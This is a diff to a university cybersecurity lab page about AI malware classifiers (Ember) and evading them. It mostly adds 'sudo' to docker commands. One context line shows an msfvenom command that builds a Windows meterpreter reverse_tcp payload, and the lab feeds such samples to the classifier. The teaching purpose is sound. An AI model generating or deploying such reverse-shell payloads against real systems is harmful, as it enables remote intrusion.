@@ -31,7 +31,7 @@ Two methods you can do this lab - using pre-built image or using public TensorFl
 {% tabs %}
 {% tab title="Windows/Linux" %}
 ```bash
-docker run -it --rm uwacyber/cits1003-labs:ai-image
+sudo docker run -it --rm uwacyber/cits1003-labs:ai-image
 ```
 {% endtab %}
 
@@ -45,7 +45,7 @@ docker run -it --rm uwacyber/cits1003-labs:ai-image-arm
 {% endtab %}
 {% endtabs %}
 
-Also install `matplotlib` to run the code later:
+Also install `matplotlib` inside the container to run the code later:
 
 ```
 pip3 install matplotlib
@@ -56,13 +56,13 @@ pip3 install matplotlib
 {% tabs %}
 {% tab title="Windows/Linux" %}
 ```bash
-docker run -it --rm tensorflow/tensorflow bash
+sudo docker run -it --rm tensorflow/tensorflow bash
 ```
 {% endtab %}
 
 {% tab title="Apple Silicon" %}
 ```
-docker run -it --rm armswdev/tensorflow-arm-neoverse-n1 bash
+sudo docker run -it --rm armswdev/tensorflow-arm-neoverse-n1 bash
 ```
 {% endtab %}
 {% endtabs %}
@@ -161,7 +161,7 @@ To do this, Ember uses a framework called LIEF that will analyse Windows (and ot
 Let's start the docker container to run Ember:
 
 ```
-docker run -it --rm uwacyber/cits1003-labs:ai-malware
+sudo docker run -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
 To test the model `cd` on the same docker container to the directory `/opt/ember`. The model has been pre-trained and so you don't need to do that, although if you are interested, you can (look at the GitHub page).
@@ -229,7 +229,7 @@ In other words, a practically 0 score for it being malware.
 To get started, we are going to run Metasploit. But firstly, we will create a local volume that we can attach to different containers - this is due to the files we are about to create will most likely be filtered automatically by your firewall. So let's create a temporary volume. In your PowerShell/terminal:
 
 ```
-docker volume create volume1
+sudo docker volume create volume1
 ```
 
 This will create a local volume named `volume1`, you can check by `docker volume ls`. Now we can attach this volume instead of host's local drive and share files between containers.
@@ -237,7 +237,7 @@ This will create a local volume named `volume1`, you can check by `docker volume
 Let's run a Docker container as follows:
 
 ```
-docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
+sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
 ```
 
 This will create a folder called `volume1` in the root directory (you can name this something else e.g., `volume1:/extra`), which is attached to the local volume `volume1`.
@@ -339,7 +339,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
 Now that we have the three different samples, we can go back to our classifier in the `ai-malware` container and see what happens. Launch the `ai-malware` container with the `volume1` attached (it will be a new container instance of the `ai-malware` image):
 
 ```
-docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai-malware
+sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
 Now, move the meterpreter files into the `/opt/ember` directory. With the first version `meterpreter1.exe` we get:
